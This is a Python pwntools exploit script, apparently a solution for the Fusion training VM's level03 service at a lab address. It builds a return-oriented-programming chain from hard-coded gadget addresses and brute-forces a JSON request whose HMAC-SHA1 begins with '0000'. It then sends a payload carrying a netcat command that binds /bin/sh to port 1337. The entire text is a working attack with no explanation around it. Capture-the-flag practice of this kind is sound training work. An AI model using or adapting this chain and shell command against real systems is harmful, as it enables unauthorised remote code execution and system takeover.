import hmac
from hashlib import sha1
from pwn import *
import json, random, string

#Connection to the host
c = remote('192.168.12.131',20003)

#Get token
token = c.recvline().split('"')[1]
log.info("Token: " + token)

rop=""
rop += p32(0x08048bf0) # pop ebx, ret
rop += p32(0xaaa9b858) # 0x0804bd1c - 0x5d5b04c4
rop += p32(0x08049b4f) # pop eax ; add esp, 0x5c ; ret
rop += p32(0xfff7b860)
rop += 'A'*0x5c        # because of add esp, 0x5c
rop += p32(0x080493fe) # add dword ptr [ebx + 0x5d5b04c4], eax ; ret
rop += p32(0x08048d40) # write PLT
rop += p32(0x08048f80) # exit PLT => objdump -d /opt/fusion/bin/level03 | grep "<exit@plt>"
#rop += p32(0x0804bdf4) # gContents => objdump -t /opt/fusion/bin/level03
rop += p32(0x0804d058) # [gContents]

#In case gContents address change, we add a lot of /
contents = '/'*400 + 'bin/nc.traditional -lp 1337 -e /bin/sh'

#Generate a request that have the first 2 bytes equal 0.
while(True):

    title = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(100)])
    msg = json.dumps({"tags":("A"), "title":title+'A'*27+'\\u1111'+'A'*31 + rop, "contents":contents, "serverip":"192.168.12.131:80"}, ensure_ascii=False)
    payload = token + "\n" + msg

    hashed = hmac.new(bytearray(token), bytearray(payload), sha1)

    if(hashed.hexdigest().startswith('0000')):
        log.info("Payload: " + payload)
        break

c.send(payload)

log.info("Payload sent!")
